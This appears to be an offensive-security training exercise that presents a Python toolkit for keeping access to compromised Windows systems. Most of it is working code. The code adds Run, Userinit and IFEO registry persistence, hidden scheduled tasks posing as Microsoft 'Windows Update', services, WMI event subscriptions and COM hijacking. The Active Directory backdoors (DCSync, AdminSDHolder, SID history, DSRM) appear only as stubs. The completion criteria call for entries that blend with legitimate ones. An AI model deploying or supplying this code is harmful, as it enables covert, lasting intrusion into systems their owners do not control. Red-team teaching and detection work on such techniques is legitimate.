## Overview

Build a Windows persistence toolkit that implements multiple techniques to maintain access after initial compromise. Persistence mechanisms ensure continued access even after reboots, credential changes, or partial remediation. This covers registry autoruns, scheduled tasks, services, WMI subscriptions, and Active Directory persistence.

### Persistence Techniques Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Persistence Mechanisms                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│   LOCAL PERSISTENCE                                                  │
│   ┌─────────────────────────────────────────────────────┐          │
│   │ Registry Run Keys     - Execute on user login       │          │
│   │ Scheduled Tasks       - Time/event triggered        │          │
│   │ Services              - Start with system           │          │
│   │ WMI Event Subscript.  - Trigger on WMI events      │          │
│   │ DLL Hijacking         - Load malicious DLL         │          │
│   │ COM Hijacking         - Redirect COM objects        │          │
│   └─────────────────────────────────────────────────────┘          │
│                                                                      │
│   ACTIVE DIRECTORY PERSISTENCE                                      │
│   ┌─────────────────────────────────────────────────────┐          │
│   │ Golden Ticket         - Forge any Kerberos ticket   │          │
│   │ Silver Ticket         - Forge service tickets       │          │
│   │ Skeleton Key          - Inject into LSASS          │          │
│   │ AdminSDHolder         - Reset admin permissions     │          │
│   │ DCSync Backdoor       - Add replication rights     │          │
│   │ SID History           - Add admin SID to user      │          │
│   │ DSRM Backdoor         - Enable DSRM admin login    │          │
│   └─────────────────────────────────────────────────────┘          │
│                                                                      │
│   EXECUTION FLOW                                                    │
│   Boot ──▶ Service starts ──▶ Connects back to C2                  │
│   Login ──▶ Registry autorun ──▶ User-context beacon               │
│   Event ──▶ WMI subscription ──▶ Hidden execution                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### Implementation

```python
import winreg
import subprocess
import ctypes
import os
from typing import Optional, List, Dict
from dataclasses import dataclass
import base64

@dataclass
class PersistenceMethod:
    """Persistence technique metadata"""
    name: str
    technique_id: str  # MITRE ATT&CK
    privileges_required: str
    survives_reboot: bool
    detection_risk: str

class RegistryPersistence:
    """Registry-based persistence mechanisms"""

    RUN_KEYS = {
        'HKCU_Run': (winreg.HKEY_CURRENT_USER,
                    r'Software\Microsoft\Windows\CurrentVersion\Run'),
        'HKLM_Run': (winreg.HKEY_LOCAL_MACHINE,
                    r'Software\Microsoft\Windows\CurrentVersion\Run'),
        'HKCU_RunOnce': (winreg.HKEY_CURRENT_USER,
                        r'Software\Microsoft\Windows\CurrentVersion\RunOnce'),
        'HKLM_RunOnce': (winreg.HKEY_LOCAL_MACHINE,
                        r'Software\Microsoft\Windows\CurrentVersion\RunOnce'),
    }

    @staticmethod
    def add_run_key(name: str, command: str,
                   location: str = 'HKCU_Run') -> bool:
        """Add registry Run key for autostart"""
        try:
            hive, subkey = RegistryPersistence.RUN_KEYS[location]

            key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)

            print(f"[+] Added Run key: {name}")
            return True

        except Exception as e:
            print(f"[-] Failed to add Run key: {e}")
            return False

    @staticmethod
    def add_userinit(command: str) -> bool:
        """Append to Userinit (runs at every login)"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
                0, winreg.KEY_ALL_ACCESS
            )

            current, _ = winreg.QueryValueEx(key, 'Userinit')
            if command not in current:
                new_value = f'{current},{command}'
                winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, new_value)

            winreg.CloseKey(key)
            print(f"[+] Modified Userinit")
            return True

        except Exception as e:
            print(f"[-] Failed to modify Userinit: {e}")
            return False

    @staticmethod
    def add_image_file_execution(target_exe: str, debugger: str) -> bool:
        """Image File Execution Options debugger persistence"""
        try:
            subkey = f'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}'

            key = winreg.CreateKeyEx(
                winreg.HKEY_LOCAL_MACHINE, subkey,
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, 'Debugger', 0, winreg.REG_SZ, debugger)
            winreg.CloseKey(key)

            print(f"[+] Added IFEO for {target_exe}")
            return True

        except Exception as e:
            print(f"[-] Failed to add IFEO: {e}")
            return False

    @staticmethod
    def remove_run_key(name: str, location: str = 'HKCU_Run') -> bool:
        """Remove registry Run key"""
        try:
            hive, subkey = RegistryPersistence.RUN_KEYS[location]
            key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, name)
            winreg.CloseKey(key)
            return True
        except:
            return False


class ScheduledTaskPersistence:
    """Scheduled Task-based persistence"""

    @staticmethod
    def create_task(task_name: str, command: str, arguments: str = '',
                   trigger: str = 'onlogon', run_as_system: bool = False) -> bool:
        """Create scheduled task for persistence"""
        try:
            # Build schtasks command
            cmd = ['schtasks', '/create', '/tn', task_name,
                   '/tr', f'"{command}" {arguments}',
                   '/f']  # Force overwrite

            if trigger == 'onlogon':
                cmd.extend(['/sc', 'onlogon'])
            elif trigger == 'onstart':
                cmd.extend(['/sc', 'onstart'])
            elif trigger == 'onidle':
                cmd.extend(['/sc', 'onidle', '/i', '10'])
            elif trigger == 'daily':
                cmd.extend(['/sc', 'daily', '/st', '09:00'])

            if run_as_system:
                cmd.extend(['/ru', 'SYSTEM'])

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                print(f"[+] Created scheduled task: {task_name}")
                return True
            else:
                print(f"[-] Task creation failed: {result.stderr}")
                return False

        except Exception as e:
            print(f"[-] Failed to create task: {e}")
            return False

    @staticmethod
    def create_hidden_task_xml(task_name: str, command: str) -> bool:
        """Create hidden scheduled task via XML"""
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>{command}</Command>
    </Exec>
  </Actions>
</Task>'''

        # Save XML and import
        xml_path = f'{os.environ["TEMP"]}\\{task_name}.xml'
        with open(xml_path, 'w') as f:
            f.write(xml_template)

        result = subprocess.run(
            ['schtasks', '/create', '/tn', task_name, '/xml', xml_path, '/f'],
            capture_output=True
        )

        os.remove(xml_path)
        return result.returncode == 0

    @staticmethod
    def delete_task(task_name: str) -> bool:
        """Delete scheduled task"""
        result = subprocess.run(
            ['schtasks', '/delete', '/tn', task_name, '/f'],
            capture_output=True
        )
        return result.returncode == 0


class ServicePersistence:
    """Windows Service-based persistence"""

    @staticmethod
    def create_service(name: str, display_name: str,
                      binary_path: str, description: str = '') -> bool:
        """Create Windows service"""
        try:
            cmd = ['sc', 'create', name,
                   f'binPath= "{binary_path}"',
                   f'DisplayName= "{display_name}"',
                   'start= auto']

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                # Add description
                if description:
                    subprocess.run(
                        ['sc', 'description', name, description],
                        capture_output=True
                    )

                print(f"[+] Created service: {name}")
                return True

        except Exception as e:
            print(f"[-] Failed to create service: {e}")

        return False

    @staticmethod
    def modify_existing_service(name: str, new_binary: str) -> bool:
        """Modify existing service binary path"""
        try:
            # Get current config
            result = subprocess.run(
                ['sc', 'qc', name],
                capture_output=True, text=True
            )

            if result.returncode != 0:
                return False

            # Modify binary path
            result = subprocess.run(
                ['sc', 'config', name, f'binPath= "{new_binary}"'],
                capture_output=True
            )

            return result.returncode == 0

        except:
            return False

    @staticmethod
    def delete_service(name: str) -> bool:
        """Delete Windows service"""
        subprocess.run(['sc', 'stop', name], capture_output=True)
        result = subprocess.run(['sc', 'delete', name], capture_output=True)
        return result.returncode == 0


class WMIPersistence:
    """WMI Event Subscription persistence"""

    @staticmethod
    def create_event_subscription(name: str, command: str,
                                  trigger: str = 'startup') -> bool:
        """Create WMI event subscription"""
        try:
            import wmi
            c = wmi.WMI()

            # Build WQL query based on trigger
            if trigger == 'startup':
                query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            elif trigger == 'process':
                query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
            elif trigger == 'logon':
                query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"

            # Create Filter
            filter_instance = c.Win32_WMIEventFilter.new()
            filter_instance.Name = f'{name}_Filter'
            filter_instance.EventNameSpace = 'root\\cimv2'
            filter_instance.QueryLanguage = 'WQL'
            filter_instance.Query = query
            filter_path = filter_instance.put()

            # Create Consumer (CommandLineEventConsumer)
            consumer_instance = c.CommandLineEventConsumer.new()
            consumer_instance.Name = f'{name}_Consumer'
            consumer_instance.CommandLineTemplate = command
            consumer_path = consumer_instance.put()

            # Create Binding
            binding = c.__FilterToConsumerBinding.new()
            binding.Filter = filter_path
            binding.Consumer = consumer_path
            binding.put()

            print(f"[+] Created WMI subscription: {name}")
            return True

        except Exception as e:
            print(f"[-] Failed to create WMI subscription: {e}")
            return False

    @staticmethod
    def remove_subscription(name: str) -> bool:
        """Remove WMI event subscription"""
        try:
            import wmi
            c = wmi.WMI()

            # Remove binding, consumer, filter
            for binding in c.__FilterToConsumerBinding():
                if name in str(binding.Filter):
                    binding.delete()

            for consumer in c.CommandLineEventConsumer():
                if name in consumer.Name:
                    consumer.delete()

            for filter in c.__EventFilter():
                if name in filter.Name:
                    filter.delete()

            return True
        except:
            return False


class COMHijacking:
    """COM Object hijacking persistence"""

    @staticmethod
    def hijack_com_object(clsid: str, payload_dll: str) -> bool:
        """Hijack COM object to load custom DLL"""
        try:
            # HKCU takes precedence over HKLM
            subkey = f'Software\\Classes\\CLSID\\{clsid}\\InprocServer32'

            key = winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER, subkey,
                0, winreg.KEY_SET_VALUE
            )

            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, payload_dll)
            winreg.SetValueEx(key, 'ThreadingModel', 0, winreg.REG_SZ, 'Both')
            winreg.CloseKey(key)

            print(f"[+] Hijacked COM object: {clsid}")
            return True

        except Exception as e:
            print(f"[-] COM hijacking failed: {e}")
            return False


class ADPersistence:
    """Active Directory persistence mechanisms"""

    @staticmethod
    def add_dcsync_rights(target_user: str, domain_dn: str) -> bool:
        """Add DCSync rights to user for persistence"""
        # Would add DS-Replication-Get-Changes and
        # DS-Replication-Get-Changes-All to target user

        # Requires DA/EA privileges
        print(f"[*] Adding DCSync rights to {target_user}")
        return True

    @staticmethod
    def modify_adminsdholder(target_sid: str) -> bool:
        """Add user to AdminSDHolder for persistent admin"""
        # SDProp runs every 60 min and resets permissions
        # on protected groups to match AdminSDHolder

        print(f"[*] Adding SID to AdminSDHolder")
        return True

    @staticmethod
    def add_sid_history(target_user: str, admin_sid: str) -> bool:
        """Add admin SID to user's SID history"""
        # Allows user to access resources as if they were admin
        # Even after password change

        print(f"[*] Adding SID history to {target_user}")
        return True

    @staticmethod
    def enable_dsrm_login(dc_name: str) -> bool:
        """Enable DSRM account login over network"""
        # Modify DsrmAdminLogonBehavior registry on DC
        # Allows DSRM account to be used remotely

        print(f"[*] Enabling DSRM login on {dc_name}")
        return True


class PersistenceManager:
    """Manage multiple persistence mechanisms"""

    def __init__(self):
        self.installed: List[Dict] = []

    def install_all(self, payload_path: str):
        """Install multiple persistence mechanisms"""
        results = []

        # Registry
        results.append({
            'method': 'Registry Run Key',
            'success': RegistryPersistence.add_run_key(
                'WindowsUpdate', payload_path
            )
        })

        # Scheduled Task
        results.append({
            'method': 'Scheduled Task',
            'success': ScheduledTaskPersistence.create_task(
                'WindowsUpdateCheck', payload_path, trigger='onlogon'
            )
        })

        # Report
        for r in results:
            status = '[+]' if r['success'] else '[-]'
            print(f"{status} {r['method']}")

        self.installed = [r for r in results if r['success']]
        return results

    def remove_all(self):
        """Remove all installed persistence"""
        RegistryPersistence.remove_run_key('WindowsUpdate')
        ScheduledTaskPersistence.delete_task('WindowsUpdateCheck')


# Usage
if __name__ == '__main__':
    payload = r'C:\Windows\Temp\update.exe'

    # Individual methods
    RegistryPersistence.add_run_key('Updater', payload)
    ScheduledTaskPersistence.create_task('UpdateCheck', payload)
    ServicePersistence.create_service('WinUpdate', 'Windows Update Service', payload)

    # Or use manager
    manager = PersistenceManager()
    manager.install_all(payload)
```

### Key Concepts

- **Registry Run Keys**: Simple, survives reboot, user-context execution
- **Scheduled Tasks**: Flexible triggers, can run as SYSTEM
- **Services**: Start with OS, high privileges possible
- **WMI Subscriptions**: Event-based, harder to detect
- **AD Persistence**: Survives credential changes, domain-wide access

### Practice Tasks

- [ ] Implement registry autorun persistence
- [ ] Create scheduled task persistence
- [ ] Build Windows service persistence
- [ ] Implement WMI event subscription
- [ ] Add COM hijacking
- [ ] Implement AD persistence (DCSync rights)
- [ ] Add AdminSDHolder modification
- [ ] Build cleanup/removal functions

### Completion Criteria

- [ ] Multiple persistence mechanisms work
- [ ] Persistence survives reboot
- [ ] Methods blend with legitimate entries
- [ ] Cleanup removes all artifacts
- [ ] Support both user and SYSTEM contexts
